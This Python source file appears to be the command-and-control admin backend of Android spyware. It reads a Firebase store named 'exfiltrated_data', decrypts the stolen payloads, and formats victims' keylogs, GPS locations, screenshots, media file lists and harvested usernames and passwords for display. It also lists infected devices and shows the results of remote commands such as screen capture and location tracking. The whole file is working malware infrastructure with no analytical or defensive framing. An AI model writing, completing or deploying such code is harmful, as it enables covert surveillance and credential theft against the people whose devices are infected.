import json
import datetime
from firebase_client import get_data
from command_manager import CommandManager
from crypto import decrypt_aes_cbc
from log_util import logger


def serve_data_listing(request_handler, data_type):
    """Serve data listing from Firebase for admin console"""
    try:
        # Get data from Firebase
        all_data = get_data('exfiltrated_data') or {}

        # Map common data types to what's actually in the database
        data_type_mapping = {
            "keylog": ["keylog", "keylogger", "keyboard", "input"],
            "location": ["location", "location_data", "gps"],
            "screenshots": ["screenshot", "screenshots", "screen", "camera", "image", "media_metadata"]
        }

        # Process data for the requested type
        entries = []
        for device_id, device_data in all_data.items():
            if not device_data:
                continue

            for type_key, type_data in device_data.items():
                # Check if this data type matches our request
                should_include = False
                if data_type == 'all':
                    # Include all data types
                    should_include = True
                elif data_type in data_type_mapping:
                    # Check if this data type is in our mapping
                    if any(mapped_type in type_key.lower() for mapped_type in data_type_mapping[data_type]):
                        should_include = True
                else:
                    # Direct match
                    should_include = (type_key.lower() == data_type.lower())

                if not should_include:
                    continue

                logger.info(f"Processing data type: {type_key} for request: {data_type}")

                for entry_id, entry in type_data.items():
                    # Extract payload
                    if isinstance(entry, dict) and "payload" in entry:
                        payload = entry.get("payload", "{}")
                        timestamp = entry.get("timestamp", "unknown")

                        try:
                            # Parse JSON string from payload
                            payload_json = json.loads(payload)

                            # Process payload files
                            if "payload" in payload_json:
                                decoded_files = {}
                                for file_name, encoded_content in payload_json["payload"].items():
                                    decoded_content = decrypt_aes_cbc(encoded_content)
                                    if decoded_content:
                                        decoded_files[file_name] = decoded_content
                                    else:
                                        decoded_files[file_name] = "Error decoding content"

                                # Replace encoded payload with decoded content
                                payload_json["decoded_files"] = decoded_files

                            # Extract real device_id from nested data if available
                            real_device_id = device_id
                            if "device_id" in payload_json and payload_json["device_id"] != "unknown_device":
                                real_device_id = payload_json["device_id"]
                            elif "data" in payload_json and isinstance(payload_json["data"], str):
                                # Try to parse nested data
                                try:
                                    nested_data = json.loads(payload_json["data"])
                                    if "device_id" in nested_data and nested_data["device_id"] != "unknown_device":
                                        real_device_id = nested_data["device_id"]
                                except json.JSONDecodeError:
                                    pass
                            elif "client_id" in payload_json and device_id == "unknown_device":
                                real_device_id = payload_json["client_id"]

                            # Format the entry for the frontend
                            formatted_entry = {
                                "device_id": real_device_id,
                                "timestamp": timestamp,
                                "data": payload_json
                            }

                            # Handle special data types
                            if type_key.lower() in ["location", "location_data", "gps"]:
                                # First check direct latitude/longitude
                                if "latitude" in payload_json and "longitude" in payload_json:
                                    formatted_entry["data"][
                                        "map_url"] = f"https://maps.google.com/?q={payload_json['latitude']},{payload_json['longitude']}"
                                # Then check inside nested data
                                elif "data" in payload_json and isinstance(payload_json["data"], str):
                                    try:
                                        nested_data = json.loads(payload_json["data"])
                                        if "latitude" in nested_data and "longitude" in nested_data:
                                            lat = nested_data["latitude"]
                                            lng = nested_data["longitude"]
                                            formatted_entry["data"]["latitude"] = lat
                                            formatted_entry["data"]["longitude"] = lng
                                            formatted_entry["data"][
                                                "map_url"] = f"https://maps.google.com/?q={lat},{lng}"
                                    except json.JSONDecodeError:
                                        pass

                            elif any(x in type_key.lower() for x in ["media", "file", "metadata"]):
                                # Handle media metadata
                                if "media_files" in payload_json:
                                    formatted_entry["data"]["files_count"] = len(payload_json["media_files"])
                                    formatted_entry["data"]["files"] = payload_json["media_files"]
                                elif "data" in payload_json and isinstance(payload_json["data"], str):
                                    try:
                                        # Try to parse nested data
                                        nested_data = json.loads(payload_json["data"])
                                        if "media_files" in nested_data:
                                            formatted_entry["data"]["files_count"] = len(nested_data["media_files"])
                                            formatted_entry["data"]["files"] = nested_data["media_files"]
                                    except:
                                        pass

                            elif any(x in type_key.lower() for x in ["credentials", "auth", "login"]):
                                # Format credentials data
                                if "username" in payload_json and "password" in payload_json:
                                    # Credentials data is already properly formatted
                                    pass
                                elif "data" in payload_json and isinstance(payload_json["data"], str):
                                    try:
                                        # Try to parse nested data
                                        nested_data = json.loads(payload_json["data"])
                                        if "username" in nested_data:
                                            formatted_entry["data"]["username"] = nested_data["username"]
                                        if "password" in nested_data:
                                            formatted_entry["data"]["password"] = nested_data["password"]
                                        if "source" in nested_data:
                                            formatted_entry["data"]["source"] = nested_data["source"]
                                    except:
                                        # If it's not JSON, check for common patterns
                                        data_str = payload_json["data"]
                                        if ":" in data_str:
                                            parts = data_str.split(":", 1)
                                            formatted_entry["data"]["username"] = parts[0]
                                            formatted_entry["data"]["password"] = parts[1]

                            # Add data type for proper display
                            formatted_entry["data_type"] = type_key

                            entries.append(formatted_entry)
                        except Exception as e:
                            logger.error(f"Error processing entry: {str(e)}")
                            entries.append({
                                "device_id": device_id,
                                "timestamp": timestamp,
                                "error": f"Error processing data: {str(e)}",
                                "raw_data": payload
                            })

        # Send the processed data
        request_handler.send_response(200)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()

        # Sort entries by timestamp (newest first)
        sorted_entries = sorted(entries, key=lambda x: x.get("timestamp", ""), reverse=True)
        request_handler.wfile.write(json.dumps(sorted_entries).encode())
        return True
    except Exception as e:
        logger.error(f"Error serving data listing: {str(e)}")
        request_handler.send_response(500)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({"error": str(e)}).encode())
        return False


def serve_command_results(request_handler, device_id):
    """Serve command results for a specific device"""
    try:
        # Get command results using CommandManager
        results = CommandManager.get_command_results(device_id)

        # Format results for frontend display
        formatted_results = []
        for result in results:
            formatted_result = {
                "command_id": result.get("command_id", "unknown"),
                "command_type": result.get("command_type", "unknown"),
                "executed_at": result.get("executed_at", "unknown"),
                "result": result.get("result", {})
            }

            # Add specific formatting for different command types
            if result.get("command_type") == "capture_screenshot" and "image_data" in result.get("result", {}):
                # Ensure image data is properly formatted
                pass
            elif result.get("command_type") == "get_location" and "latitude" in result.get("result",
                                                                                           {}) and "longitude" in result.get(
                    "result", {}):
                # Add map link
                lat = result["result"]["latitude"]
                lng = result["result"]["longitude"]
                formatted_result["result"]["map_url"] = f"https://maps.google.com/?q={lat},{lng}"

            formatted_results.append(formatted_result)

        request_handler.send_response(200)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps(formatted_results).encode())
        return True
    except Exception as e:
        logger.error(f"Error serving command results: {str(e)}")
        request_handler.send_response(500)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({"error": str(e)}).encode())
        return False


def serve_devices_listing(request_handler):
    """Serve list of devices for admin console"""
    try:
        # Get devices from CommandManager
        devices = CommandManager.get_devices()

        # Format the device data for the frontend
        formatted_devices = []
        for device in devices:
            formatted_device = {
                "device_id": device.get("device_id", "unknown"),
                "registration_time": device.get("registration_time", "unknown"),
                "last_seen": device.get("last_seen", "unknown"),
                "device_info": {
                    "model": device.get("device_info", {}).get("model", "Unknown"),
                    "manufacturer": device.get("device_info", {}).get("manufacturer", "Unknown"),
                    "android_version": device.get("device_info", {}).get("android_version", "Unknown"),
                    "sdk_level": device.get("device_info", {}).get("sdk_level", "Unknown")
                }
            }
            formatted_devices.append(formatted_device)

        request_handler.send_response(200)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps(formatted_devices).encode())
        return True
    except Exception as e:
        logger.error(f"Error serving devices listing: {str(e)}")
        request_handler.send_response(500)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({"error": str(e)}).encode())
        return False